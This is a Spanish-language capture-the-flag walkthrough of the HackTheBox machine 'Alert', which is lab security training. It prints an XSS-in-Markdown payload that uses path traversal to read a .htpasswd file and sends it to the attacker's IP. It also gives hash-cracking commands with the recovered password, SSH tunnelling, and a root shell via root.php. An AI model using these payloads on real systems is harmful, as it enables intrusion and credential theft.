Para empezar a resolver esta maquina el primer paso fue enumerar sus puertos abiertos y al utilizar nmap encontramos que el puerto 22 y 80 estaban
abiertos y que al acceder desde el navegador a la ip nos redirigia a un dominio el cual era alert.htb

El segundao paso fue hacer un fuzz parar descubrir directorios dentro del servidor web usando en la terminal la aplciacion ffuz para hacer dicho analisis
en el cual encontramos los siguientes direcotios: css, server-status, messages y uploads

Realice un escaneo mas especifico en busca de mas archivos .php en la pagina, no encontre mcuhas cosas solo encontre messages.php, pero ciertamente puede 
que halla una plataforma o algo en especifico donde el archivo de messages.php se use.\
comando usado: ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  -u "http://alert.htb/FUZZ" -ic -e .php

Realice otro escaneo pero esta vez de sub-dominios con la misma herramienta saliendo como resultado el subdominio staticts
comando usado: ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FFUZ -H "HOST: FFUZ.alert.htb" -u http://alert.htb -fw 20

Despues de ingresar al subdominio que acaba de encontrar vi que pedia que ingresara con una contrasena y usuario las cuales no tenia y despues de 
investigar encontre un ataque que se llama xss el cual me permite inyectar codigo pero no supe como aplicarlo asi que decidi regresar a la pagina
inicial y subir un codigo para intentar un reverse shell.

Al intentar subir un codigo ecnontre que solo permite archivos .md asi que me di a la tarea de investigar una forma de hacer un script que me permite
hacer una reverse shell en este tipo de archivos y encontre el siguinte script.

<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://<tun0 IP>:<port>/?file_content=" + encodeURIComponent(data));
  });
</script>

con el cual al subir el documento y luego hacerle un request al documento desde el apartado de contactanos de la siguinet manera logramos consegui esto 
de resultado

email: "Puedes poner cualquier que sea valido"
mensaje: http://alert.htb/visualizer.php?link_share=6787f88665cd44.39820836.md

el linke del mensaje fue la confiramcion de que se subio el archivo y ese es el link que ponemos en el correo para que se envie la peticion, antes de 
enviar el correo en el apartado de contactanos levantamos un servidor web con python3

python3 -m http.server <puerto>

una vez levantado el servicio mandamos el correo y nos da como resultado este codificado el cual se debe de decodificar.

10.10.11.44 - - [29/Mar/2025 19:50:56] "GET /?file_content=%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1" 

al decifrar esta parte %3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A con cyberchef encontramos las copntrasenas de un server
apache el cual supuse que se puede usar en el login que hay en el staticts

albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/

usara john para sacar la contrasena hasheda, al aprecer es md5-long
comando: john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/Documents/alert/hash.txt

une vez terminado el usuario y contrasena son los siguintes.

usuario: albert
contrasena: manchesterunited

con estos datos logramos conectarnos por ssh al servidor y tambien logramos poder acceder al panel de staticts que no tenia gran infromacion relevante pero al
entrar al ssh nos econtramos con la flag del usuario y la herramienta de leanpeas la cual no pude usar porque no tenia privilegios.

user-flag: 5bfab0760bfdec2f60a3******203d0

y tambien al estar explorando encontre que en la carpeta de /opt habia en una de sus subcarpeta un archivo llamado root.php eel cual ejecute desde la ip 
127.0.0.1:8080 ya que en el habia una pagina web la cual nos marcaba el estatus del servicio y este puerto no elcontre gracias al listar los puertos
escuchado con netstat

comando: netstat -tuln
comando-ssh: ssh -L 8080:127.0.0.1:8080 albert@alert.htb

al entrar a la pagina del estatus intente ingresar al archivo llamado root ya que la pagina y el php se encontraban alojados en el mismo lugar.

127.0.0.1:8080/config/root.php

al resolver esta liga y ya tener el nc preparado para recibir la conexion nos logeaamos directamnete como usuario root el cual nos permitira realizar todo 
lo que queramos 

flag-root: 1faec45baea6ac07fc89******e9ef

y con esto logramos resolver la maquina alert.
 
